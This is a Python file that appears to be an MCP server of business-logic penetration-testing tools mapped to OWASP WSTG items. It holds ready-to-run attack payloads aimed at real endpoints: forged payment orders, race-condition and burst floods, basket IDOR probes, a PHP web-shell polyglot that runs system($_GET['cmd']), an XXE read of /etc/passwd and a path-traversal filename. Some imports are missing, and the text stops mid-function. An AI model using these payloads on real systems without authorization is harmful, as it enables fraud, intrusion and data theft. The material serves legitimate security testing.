# from mcp.server.fastmcp import FastMCP  # REMOVED: Using JSON-RPC adapter
import asyncio
import httpx
import random
import string
import re
import json
import time
from typing import Dict, Any, List, Optional

# Logging configuration
import logging
import sys

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s [business-logic-testing] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

from urllib.parse import urlparse, parse_qs, urlunparse

# mcp = FastMCP(  # REMOVED: Using JSON-RPC adapter"business-logic-testing")

# --- Helpers ---
def build_request_kwargs(auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Build request kwargs with authentication if provided."""
    kwargs = {"timeout": 8, "follow_redirects": False, "verify": False}
    if auth_session:
        if 'cookies' in auth_session:
            kwargs['cookies'] = auth_session['cookies']
        if 'headers' in auth_session:
            kwargs['headers'] = auth_session.get('headers', {})
        elif 'token' in auth_session:
            kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
    return kwargs

async def req(method: str, url: str, auth_session: Optional[Dict[str, Any]] = None, **kwargs) -> Optional[httpx.Response]:
    try:
        req_kwargs = build_request_kwargs(auth_session)
        req_kwargs.update(kwargs)
        async with httpx.AsyncClient(**req_kwargs) as cli:
            return await cli.request(method, url, **{k: v for k, v in kwargs.items() if k not in ['timeout', 'follow_redirects', 'verify', 'cookies', 'headers']})
    except Exception:
        return None

# --- Tools (Revisi, Peningkatan & Baru) ---

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_data_validation_extremes(url_with_fuzz: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [REVISI] Sends boundary and bogus values to a parameter to test data validation.
    logger.info(f"🔍 Executing test_data_validation_extremes")
    Uses ffuf's JSON output for reliable parsing.
    """
    try:
        # Menggunakan file sementara untuk output JSON ffuf
        output_file = f"/tmp/bl_val_{random.randint(1000, 9999)}.json"
        # Wordlist: 0, 1 (batas bawah), 999999 (angka besar), -1 (negatif), abc (string)
        cmd = f"ffuf -u '{url_with_fuzz}' -w -:0,1,999999,-1,abc -mc all -of json -o {output_file}"
        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        await proc.communicate()

        if not os.path.exists(output_file):
            return {"status": "error", "message": "ffuf did not produce an output file."}

        with open(output_file, 'r') as f:
            results = json.load(f).get("results", [])
        os.remove(output_file)

        # Cari respons yang tidak biasa, terutama error server (5xx)
        interesting_results = [r for r in results if r['status'] >= 500 or r['length'] == 0]
        return {"status": "success", "data": {"results": interesting_results}}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_parameter_tampering(url: str, param_to_remove: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [PENINGKATAN] Removes a specified parameter from a URL to see if the server-side logic is affected.
    logger.info(f"🔍 Executing test_parameter_tampering")
    """
    try:
        # Hapus parameter yang ditentukan dari URL
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        if param_to_remove in params:
            del params[param_to_remove]
        
        new_query = urlencode(params, doseq=True)
        stripped_url = urlunparse(parsed_url._replace(query=new_query))

        original_resp = await req("GET", url, auth_session=auth_session)
        stripped_resp = await req("GET", stripped_url, auth_session=auth_session)

        if not original_resp or not stripped_resp:
            return {"status": "error", "message": "One or more requests failed."}

        is_different = (original_resp.status_code != stripped_resp.status_code) or \
                       (abs(len(original_resp.content) - len(stripped_resp.content)) > 50) # Toleransi kecil

        return {"status": "success", "data": {
            "tampering_detected": not is_different,
            "original_response": {"status": original_resp.status_code, "length": len(original_resp.content)},
            "tampered_response": {"status": stripped_resp.status_code, "length": len(stripped_resp.content)},
            "description": "If responses are similar, the server may not be re-validating data after parameter removal."
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_mass_assignment(url: str, method: str, valid_data: Dict[str, Any], evil_params: Dict[str, Any], auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [BARU] Tests for Mass Assignment by submitting extra, unauthorized parameters.
    logger.info(f"🔍 Executing test_mass_assignment")
    Example evil_params: {"isAdmin": True, "account_balance": 9999}
    """
    try:
        # Gabungkan data valid dengan parameter jahat
        payload = {**valid_data, **evil_params}
        
        resp = await req(method.upper(), url, auth_session=auth_session, json=payload if method.upper() in ["POST", "PUT"] else None, data=payload if method.upper() == "POST" else None)

        if not resp:
            return {"status": "error", "message": "Request failed."}

        return {"status": "success", "data": {
            "url": url,
            "method": method,
            "payload_sent": payload,
            "response_status": resp.status_code,
            "response_body_preview": resp.text[:500],
            "instructions": "Manually verify if the evil parameters (e.g., isAdmin) were successfully saved by checking the user's profile or state."
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_process_timing_race_condition(url: str, method: str, runs: int = 10, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [REVISI] Fires N concurrent requests to test for race conditions (e.g., double-spend).
    logger.info(f"🔍 Executing test_process_timing_race_condition")
    """
    try:
        async def fire():
            # Menambahkan data acak untuk memastikan setiap request unik jika diperlukan
            return await req(method.upper(), url, auth_session=auth_session, json={"item_id": 1, "nonce": random.randint(10000, 99999)})

        tasks = [fire() for _ in range(runs)]
        responses = await asyncio.gather(*tasks)
        
        status_codes = [r.status_code if r else 0 for r in responses]
        
        # Kerentanan mungkin ada jika beberapa request berhasil (200) sementara yang lain gagal (4xx)
        successful_requests = status_codes.count(200) + status_codes.count(201)
        
        return {"status": "success", "data": {
            "total_requests": runs,
            "status_codes_received": status_codes,
            "successful_requests": successful_requests,
            "description": f"Received {successful_requests} successful statuses out of {runs}. If > 1, may indicate a race condition."
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_usage_limits_burst(url: str, method: str, burst_count: int = 20, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [PENINGKATAN] Hits an endpoint with a rapid burst of concurrent requests to test rate-limiting.
    logger.info(f"🔍 Executing test_usage_limits_burst")
    """
    try:
        async def fire():
            return await req(method.upper(), url, auth_session=auth_session)

        tasks = [fire() for _ in range(burst_count)]
        responses = await asyncio.gather(*tasks)

        status_codes = [r.status_code if r else 0 for r in responses]
        rate_limit_triggered = 429 in status_codes
        
        return {"status": "success", "data": {
            "total_requests": burst_count,
            "status_codes_received": status_codes,
            "rate_limit_enforced": rate_limit_triggered
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_file_upload_logic(upload_url: str, filename: str, content: bytes, content_type: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [KONSOLIDASI] A generic tool to test file upload logic with various file types.
    logger.info(f"🔍 Executing test_file_upload_logic")
    Consolidates test_unexpected_upload and test_malicious_upload.
    """
    try:
        files = {'file': (filename, content, content_type)}
        resp = await req("POST", upload_url, auth_session=auth_session, files=files)
        if not resp:
            return {"status": "error", "message": "Upload request failed."}
            
        return {"status": "success", "data": {
            "filename_sent": filename,
            "content_type_sent": content_type,
            "response_status": resp.status_code,
            "description": "Check status code. 200/201 may indicate success. 400/415 is expected for invalid files."
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def get_manual_checklist(topic: str) -> Dict[str, Any]:
    """
    [KONSOLIDASI] Provides checklists for manual business logic testing.
    Topics: 'integrity_checks', 'workflow_circumvention', 'app_misuse'
    """
    checklists = {
        "integrity_checks": [
            "During a transaction, intercept the request and modify the price or quantity of an item to a lower or negative value. Verify if the server rejects it.",
            "If a JWT or cookie contains privilege information (e.g., 'role: user'), modify it to 'role: admin' and see if access changes.",
            "Check if checksums or signatures for client-side data are validated on the server."
        ],
        "workflow_circumvention": [
            "Map out a multi-step process (e.g., checkout). Try to access step 3 directly by guessing the URL, bypassing steps 1 and 2.",
            "Look for JavaScript flags in the browser that control UI flow (e.g., `isPaymentStepComplete = true`). Try to manipulate them in the console.",
            "If a process depends on a specific sequence of API calls, try calling them out of order."
        ],
        "app_misuse": [
            "Identify resource-intensive operations (e.g., report generation, complex search). Try to trigger them repeatedly to test for DoS protection.",
            "Test for CAPTCHA or other anti-automation controls on critical functions like login, registration, and password reset after several attempts.",
            "If there is a 'free trial' feature, check if you can sign up for multiple trials using slight variations of an email address (e.g., user+1@, user+2@)."
        ]
    }
    if topic in checklists:
        return {"status": "success", "data": {"topic": topic, "checklist": checklists[topic]}}
    else:
        return {"status": "error", "message": f"Invalid topic. Available topics: {list(checklists.keys())}"}

# ========== OPSI C: 7 COMPREHENSIVE BUSINESS LOGIC TOOLS ==========

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_business_data_validation(base_url: str, test_endpoints: List[str] = None, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [OPSI C] Tests business data validation for price/quantity manipulation.
    logger.info(f"🔍 Executing test_business_data_validation")
    Tests negative prices, zero amounts, extreme quantities, discount abuse.
    WSTG-BUSL-01: Test Business Logic Data Validation
    """
    if test_endpoints is None:
        test_endpoints = ["/api/cart/add", "/api/order/create", "/api/product/update", "/checkout"]
    
    try:
        findings = []
        
        # Price manipulation payloads
        price_tests = [
            {"name": "negative_price", "price": -100, "quantity": 1},
            {"name": "zero_price", "price": 0, "quantity": 10},
            {"name": "extreme_quantity", "price": 10, "quantity": 999999},
            {"name": "negative_quantity", "price": 10, "quantity": -5},
            {"name": "fractional_abuse", "price": 0.01, "quantity": 1000},
        ]
        
        req_kwargs = {"verify": False, "follow_redirects": False, "timeout": 10}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
        async with httpx.AsyncClient(**req_kwargs) as client:
            for endpoint in test_endpoints:
                url = f"{base_url.rstrip('/')}{endpoint}"
                
                for test in price_tests:
                    try:
                        # POST manipulation
                        resp = await client.post(url, json={
                            "product_id": 1,
                            "price": test["price"],
                            "quantity": test["quantity"],
                            "total": test["price"] * test["quantity"]
                        })
                        
                        # If server accepts invalid business data
                        if resp.status_code in [200, 201]:
                            content = resp.text.lower()
                            if "success" in content or "created" in content:
                                findings.append({
                                    "endpoint": endpoint,
                                    "test_name": test["name"],
                                    "payload": test,
                                    "status_code": resp.status_code,
                                    "severity": "Critical",
                                    "description": f"Server accepted invalid business data: {test['name']}"
                                })
                    except Exception:
                        continue
        
        return {"status": "success", "data": {
            "endpoints_tested": len(test_endpoints),
            "validation_tests": len(price_tests),
            "vulnerabilities_found": len(findings),
            "findings": findings,
            "description": "Business logic should validate prices, quantities, and calculations server-side"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_forge_requests(payment_url: str, legitimate_order: Dict[str, Any] = None, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [OPSI C] Tests for payment/order forging vulnerabilities.
    logger.info(f"🔍 Executing test_forge_requests")
    Attempts to bypass payment by manipulating order parameters.
    WSTG-BUSL-02: Test Ability to Forge Requests
    """
    if legitimate_order is None:
        legitimate_order = {
            "order_id": 12345,
            "user_id": 1,
            "amount": 99.99,
            "paid": False,
            "status": "pending"
        }
    
    try:
        findings = []
        
        # Forgery attempts
        forgery_tests = [
            {"name": "mark_as_paid", "modifications": {"paid": True}},
            {"name": "change_status_completed", "modifications": {"status": "completed"}},
            {"name": "modify_amount_zero", "modifications": {"amount": 0}},
            {"name": "elevate_to_admin", "modifications": {"user_id": 1, "role": "admin"}},
            {"name": "add_discount_100", "modifications": {"discount": 100}},
        ]
        
        req_kwargs = {"verify": False, "follow_redirects": False, "timeout": 10}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
        async with httpx.AsyncClient(**req_kwargs) as client:
            for test in forgery_tests:
                forged_order = {**legitimate_order, **test["modifications"]}
                
                try:
                    # Attempt to submit forged request
                    resp = await client.post(payment_url, json=forged_order)
                    
                    if resp.status_code in [200, 201]:
                        content = resp.text.lower()
                        if "success" in content or "approved" in content or "completed" in content:
                            findings.append({
                                "test_name": test["name"],
                                "forged_parameters": test["modifications"],
                                "status_code": resp.status_code,
                                "severity": "Critical",
                                "description": f"Payment bypass: {test['name']} succeeded"
                            })
                except Exception:
                    continue
        
        return {"status": "success", "data": {
            "forgery_attempts": len(forgery_tests),
            "successful_bypasses": len(findings),
            "findings": findings,
            "description": "Payment systems must validate all order parameters server-side"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_race_conditions(target_url: str, concurrent_requests: int = 10, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [OPSI C] Tests for race condition vulnerabilities (TOCTOU).
    logger.info(f"🔍 Executing test_race_conditions")
    Sends concurrent requests to check for double-spend or duplicate processing.
    WSTG-BUSL-03: Test Integrity Checks
    """
    try:
        results = []
        start_time = time.time()
        
        req_kwargs = {"verify": False, "follow_redirects": False, "timeout": 15}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
        async with httpx.AsyncClient(**req_kwargs) as client:
            # Send concurrent requests
            tasks = []
            for i in range(concurrent_requests):
                task = client.post(target_url, json={
                    "action": "apply_coupon",
                    "coupon_code": "RACE100",
                    "amount": 100
                })
                tasks.append(task)
            
            # Execute all at once
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Analyze results
            success_count = 0
            for i, resp in enumerate(responses):
                if isinstance(resp, Exception):
                    continue
                    
                results.append({
                    "request_num": i + 1,
                    "status_code": resp.status_code,
                    "success": resp.status_code in [200, 201],
                    "response_time_ms": int((time.time() - start_time) * 1000)
                })
                
                if resp.status_code in [200, 201]:
                    content = resp.text.lower()
                    if "success" in content or "applied" in content:
                        success_count += 1
        
        # Race condition detected if multiple requests succeeded
        race_condition_found = success_count > 1
        
        return {"status": "success", "data": {
            "concurrent_requests_sent": concurrent_requests,
            "successful_responses": success_count,
            "race_condition_detected": race_condition_found,
            "severity": "High" if race_condition_found else "Info",
            "results": results,
            "description": "Race condition allows coupon/action to be applied multiple times" if race_condition_found else "No race condition detected"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_function_limits(target_url: str, burst_count: int = 50, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [OPSI C] Tests for missing rate limiting and resource exhaustion.
    logger.info(f"🔍 Executing test_function_limits")
    Sends burst requests to check for DoS protection.
    WSTG-BUSL-04: Test for Process Timing
    """
    try:
        results = []
        rate_limit_detected = False
        
        req_kwargs = {"verify": False, "follow_redirects": False, "timeout": 10}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
        async with httpx.AsyncClient(**req_kwargs) as client:
            for i in range(burst_count):
                try:
                    start = time.time()
                    resp = await client.post(target_url, json={"test": f"burst_{i}"})
                    elapsed_ms = int((time.time() - start) * 1000)
                    
                    results.append({
                        "request_num": i + 1,
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed_ms
                    })
                    
                    # Check for rate limiting
                    if resp.status_code == 429 or "rate limit" in resp.text.lower():
                        rate_limit_detected = True
                        break
                    
                    # Minimal delay
                    await asyncio.sleep(0.05)
                except Exception as e:
                    results.append({"request_num": i + 1, "error": str(e)})
                    break
        
        avg_response_time = sum(r.get("response_time_ms", 0) for r in results) / len(results) if results else 0
        
        return {"status": "success", "data": {
            "burst_requests_sent": len(results),
            "rate_limiting_detected": rate_limit_detected,
            "average_response_time_ms": int(avg_response_time),
            "severity": "Medium" if not rate_limit_detected else "Info",
            "description": "No rate limiting - function vulnerable to abuse/DoS" if not rate_limit_detected else "Rate limiting is active",
            "sample_results": results[:5]
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_workflow_bypass(base_url: str, workflow_steps: List[str] = None, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [OPSI C] Tests for workflow circumvention vulnerabilities.
    logger.info(f"🔍 Executing test_workflow_bypass")
    Attempts to skip steps in multi-step processes (checkout, registration).
    WSTG-BUSL-06: Test for Workflow Circumvention
    """
    if workflow_steps is None:
        workflow_steps = [
            "/step1-cart",
            "/step2-shipping",
            "/step3-payment",
            "/step4-confirmation"
        ]
    
    try:
        findings = []
        
        req_kwargs = {"verify": False, "follow_redirects": True, "timeout": 10}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
        async with httpx.AsyncClient(**req_kwargs) as client:
            # Test 1: Direct access to final step without completing previous steps
            final_step = workflow_steps[-1]
            final_url = f"{base_url.rstrip('/')}{final_step}"
            
            try:
                resp = await client.get(final_url)
                
                if resp.status_code == 200:
                    content = resp.text.lower()
                    # Check if we can access final step
                    if "confirmation" in content or "success" in content or "order placed" in content:
                        findings.append({
                            "type": "direct_final_step_access",
                            "step": final_step,
                            "severity": "High",
                            "description": "Can access final step without completing prerequisites"
                        })
            except Exception:
                pass
            
            # Test 2: Access steps out of order
            for i in range(len(workflow_steps) - 1, 0, -1):
                try:
                    url = f"{base_url.rstrip('/')}{workflow_steps[i]}"
                    resp = await client.get(url)
                    
                    if resp.status_code == 200 and len(resp.text) > 100:
                        findings.append({
                            "type": "out_of_order_access",
                            "step": workflow_steps[i],
                            "severity": "Medium",
                            "description": f"Step {i+1} accessible without completing step {i}"
                        })
                except Exception:
                    continue
            
            # Test 3: Submit final action via POST without session state
            try:
                final_action_url = f"{base_url.rstrip('/')}/complete-order"
                resp = await client.post(final_action_url, json={
                    "order_id": "bypass_test",
                    "bypass": True
                })
                
                if resp.status_code in [200, 201]:
                    findings.append({
                        "type": "workflow_bypass_post",
                        "severity": "Critical",
                        "description": "Can complete order via POST without workflow validation"
                    })
            except Exception:
                pass
        
        return {"status": "success", "data": {
            "workflow_steps_tested": len(workflow_steps),
            "bypass_vulnerabilities_found": len(findings),
            "findings": findings,
            "description": "Multi-step workflows must validate completion of previous steps"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_unexpected_file_upload(upload_url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [OPSI C] Tests file upload logic for unexpected file types.
    logger.info(f"🔍 Executing test_unexpected_file_upload")
    Checks if system properly validates file types and content.
    WSTG-BUSL-08: Test Upload of Unexpected File Types
    """
    try:
        findings = []
        
        # Test files with unexpected extensions
        test_files = [
            {"name": "test.php", "content": "<?php phpinfo(); ?>", "type": "application/x-php"},
            {"name": "test.jsp", "content": "<% out.println('JSP'); %>", "type": "application/jsp"},
            {"name": "test.html", "content": "<script>alert(1)</script>", "type": "text/html"},
            {"name": "test.svg", "content": '<svg onload="alert(1)"/>', "type": "image/svg+xml"},
            {"name": "test.exe", "content": "MZ", "type": "application/octet-stream"},
            {"name": "../../etc/passwd", "content": "path traversal test", "type": "text/plain"},
        ]
        
        req_kwargs = {"verify": False, "follow_redirects": False, "timeout": 10}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
        async with httpx.AsyncClient(**req_kwargs) as client:
            for test_file in test_files:
                try:
                    files = {"file": (test_file["name"], test_file["content"], test_file["type"])}
                    resp = await client.post(upload_url, files=files)
                    
                    if resp.status_code in [200, 201]:
                        content = resp.text.lower()
                        if "success" in content or "uploaded" in content:
                            findings.append({
                                "filename": test_file["name"],
                                "file_type": test_file["type"],
                                "status_code": resp.status_code,
                                "severity": "High" if test_file["name"].endswith((".php", ".jsp", ".exe")) else "Medium",
                                "description": f"System accepted dangerous file: {test_file['name']}"
                            })
                except Exception:
                    continue
        
        return {"status": "success", "data": {
            "file_types_tested": len(test_files),
            "unsafe_uploads_accepted": len(findings),
            "findings": findings,
            "description": "File uploads must validate both extension and content type"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_malicious_file_upload(upload_url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    [OPSI C] Tests for malicious file upload processing.
    logger.info(f"🔍 Executing test_malicious_file_upload")
    Checks for polyglot files, ZIP bombs, and malicious content parsing.
    WSTG-BUSL-09: Test Upload of Malicious Files
    """
    try:
        findings = []
        
        # Malicious file tests
        malicious_tests = [
            {
                "name": "polyglot.jpg.php",
                "content": "GIF89a<?php system($_GET['cmd']); ?>",
                "type": "image/gif",
                "description": "Polyglot file (GIF + PHP)"
            },
            {
                "name": "xxe.xml",
                "content": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                "type": "application/xml",
                "description": "XXE payload"
            },
            {
                "name": "rce.pdf",
                "content": "%PDF-1.4\n/OpenAction <</S /JavaScript /JS (app.alert('XSS'))>>",
                "type": "application/pdf",
                "description": "PDF with JavaScript"
            },
            {
                "name": "zipbomb.zip",
                "content": b"\x50\x4b\x03\x04",  # Minimal ZIP header
                "type": "application/zip",
                "description": "Potential ZIP bomb"
            },
        ]
        
        req_kwargs = {"verify": False, "follow_redirects": False, "timeout": 15}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
        async with httpx.AsyncClient(**req_kwargs) as client:
            for test in malicious_tests:
                try:
                    files = {"file": (test["name"], test["content"], test["type"])}
                    resp = await client.post(upload_url, files=files)
                    
                    if resp.status_code in [200, 201]:
                        findings.append({
                            "test_name": test["description"],
                            "filename": test["name"],
                            "status_code": resp.status_code,
                            "severity": "Critical",
                            "description": f"Malicious file accepted: {test['description']}"
                        })
                    elif resp.status_code == 500:
                        # Server crashed - possible vulnerability
                        findings.append({
                            "test_name": test["description"],
                            "filename": test["name"],
                            "status_code": 500,
                            "severity": "High",
                            "description": f"Server error processing {test['description']} - possible DoS"
                        })
                except Exception as e:
                    if "timeout" in str(e).lower():
                        findings.append({
                            "test_name": test["description"],
                            "error": "Timeout",
                            "severity": "High",
                            "description": f"Processing {test['description']} caused timeout - possible DoS"
                        })
                    continue
        
        return {"status": "success", "data": {
            "malicious_tests_performed": len(malicious_tests),
            "vulnerabilities_found": len(findings),
            "findings": findings,
            "description": "File processing must validate content and prevent malicious payloads"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_shopping_cart_manipulation(
    base_url: str,
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    PHASE 2.5: Test shopping cart for business logic vulnerabilities.

    Common e-commerce vulnerabilities tested:
    1. Negative quantity vulnerability (allows negative prices)
    2. Price manipulation in basket
    3. Other user's basket access (IDOR)
    4. Coupon code replay attacks
    5. Checkout process bypass

    Args:
        base_url: Target application base URL
        auth_session: Authentication session dict with token/cookies

    Returns:
        Dict with vulnerability findings
    """
    try:
        findings = []
        headers = {}

        # Setup authentication
        if auth_session:
            token = auth_session.get("token") or auth_session.get("access_token")
            if token:
                headers["Authorization"] = f"Bearer {token}"
            cookies = auth_session.get("cookies")
            if isinstance(cookies, dict):
                cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                headers["Cookie"] = cookie_str

        async with httpx.AsyncClient(timeout=30, verify=False, follow_redirects=True) as client:
            # TEST 1: Negative Quantity Vulnerability
            basket_endpoint = f"{base_url}/api/BasketItems"
            try:
                # Add product with negative quantity
                negative_qty_payload = {
                    "ProductId": 1,
                    "BasketId": "1",
                    "quantity": -100
                }

                resp = await client.post(
                    basket_endpoint,
                    json=negative_qty_payload,
                    headers=headers
                )

                if resp.status_code in [200, 201]:
                    # Check if negative quantity was accepted
                    try:
                        basket_resp = await client.get(
                            f"{base_url}/rest/basket/1",
                            headers=headers
                        )
                        if basket_resp.status_code == 200:
                            basket_data = basket_resp.json()
                            total = basket_data.get("data", {}).get("total", 0)
                            if total < 0:
                                findings.append({
                                    "type": "NEGATIVE_QUANTITY",
                                    "severity": "HIGH",
                                    "endpoint": basket_endpoint,
                                    "evidence": f"Cart total: {total} (negative value accepted)",
                                    "description": "Shopping cart accepts negative quantities, allowing price manipulation"
                                })
                                logger.info(f"[shopping_cart] HIGH: Negative quantity accepted! Total: {total}")
                    except:
                        pass
            except Exception as e:
                logger.warning(f"[shopping_cart] Negative quantity test failed: {e}")

            # TEST 2: Price Manipulation
            try:
                # Try to modify price directly
                price_manip_payload = {
                    "ProductId": 1,
                    "BasketId": "1",
                    "quantity": 1,
                    "price": 0.01  # Attempt to set price to $0.01
                }

                resp = await client.post(
                    basket_endpoint,
                    json=price_manip_payload,
                    headers=headers
                )

                if resp.status_code in [200, 201]:
                    findings.append({
                        "type": "PRICE_MANIPULATION",
                        "severity": "HIGH",
                        "endpoint": basket_endpoint,
                        "evidence": "Server accepted custom 'price' parameter in basket",
                        "description": "Application allows client to set product price"
                    })
                    logger.info("[shopping_cart] HIGH: Price manipulation possible!")
            except Exception as e:
                logger.warning(f"[shopping_cart] Price manipulation test failed: {e}")

            # TEST 3: IDOR - Access other user's basket
            try:
                # Try to access baskets with IDs 1-10
                for basket_id in range(1, 11):
                    basket_url = f"{base_url}/rest/basket/{basket_id}"
                    resp = await client.get(basket_url, headers=headers)

                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if data and "data" in data:
                                # Successfully accessed another user's basket
                                findings.append({
                                    "type": "BASKET_IDOR",
                                    "severity": "MEDIUM",
                                    "endpoint": basket_url,
                                    "evidence": f"Accessed basket ID {basket_id} without authorization check",
                                    "description": "IDOR vulnerability allows viewing other users' shopping carts"
                                })
                                logger.info(f"[shopping_cart] MEDIUM: IDOR found for basket {basket_id}")
                                break  # Report only once
                        except:
                            pass
            except Exception as e:
                logger.warning(f"[shopping_cart] IDOR test failed: {e}")

            # TEST 4: Coupon Code Replay
            try:
                # Try applying the same coupon multiple times
                coupon_endpoint = f"{base_url}/rest/basket/1/coupon/INVALID123"

                for attempt in range(3):
                    resp = await client.put(coupon_endpoint, headers=headers)

                    if resp.status_code == 200:
                        if attempt > 0:  # If second+ application succeeded
                            findings.append({
                                "type": "COUPON_REPLAY",
                                "severity": "MEDIUM",
                                "endpoint": coupon_endpoint,
                                "evidence": f"Coupon applied {attempt + 1} times successfully",
                                "description": "Application allows same coupon to be applied multiple times"
                            })
                            logger.info(f"[shopping_cart] MEDIUM: Coupon replay possible!")
                            break
            except Exception as e:
                logger.warning(f"[shopping_cart] Coupon replay test failed: {e}")

            # TEST 5: Quantity Update Tampering
            try:
                # Try to update quantity to negative value via PUT
                quantity_endpoint = f"{base_url}/api/Quantitys/1"
                tampered_qty = {"quantity": -999}

                resp = await client.put(
                    quantity_endpoint,
                    json=tampered_qty,
                    headers=headers
                )

                if resp.status_code in [200, 201]:
                    findings.append({
                        "type": "QUANTITY_TAMPERING",
                        "severity": "HIGH",
                        "endpoint": quantity_endpoint,
                        "evidence": "Negative quantity accepted via PUT request",
                        "description": "Quantity update endpoint lacks validation"
                    })
                    logger.info("[shopping_cart] HIGH: Quantity tampering successful!")
            except Exception as e:
                logger.warning(f"[shopping_cart] Quantity tampering test failed: {e}")

            # TEST 6: Zero-Price Checkout
            try:
                # Create basket with zero quantity to check for free checkout
                zero_qty_payload = {
                    "ProductId": 1,
                    "BasketId": "1",
                    "quantity": 0
                }

                resp = await client.post(
                    basket_endpoint,
                    json=zero_qty_payload,
                    headers=headers
                )

                if resp.status_code in [200, 201]:
                    # Try to checkout with zero total
                    checkout_url = f"{base_url}/rest/basket/1/checkout"
                    checkout_resp = await client.post(checkout_url, headers=headers)

                    if checkout_resp.status_code == 200:
                        findings.append({
                            "type": "ZERO_PRICE_CHECKOUT",
                            "severity": "HIGH",
                            "endpoint": checkout_url,
                            "evidence": "Checkout succeeded with zero quantity items",
                            "description": "Application allows checkout without validating cart contents"
                        })
                        logger.info("[shopping_cart] HIGH: Zero-price checkout possible!")
            except Exception as e:
                logger.warning(f"[shopping_cart] Zero-price checkout test failed: {e}")

        return {
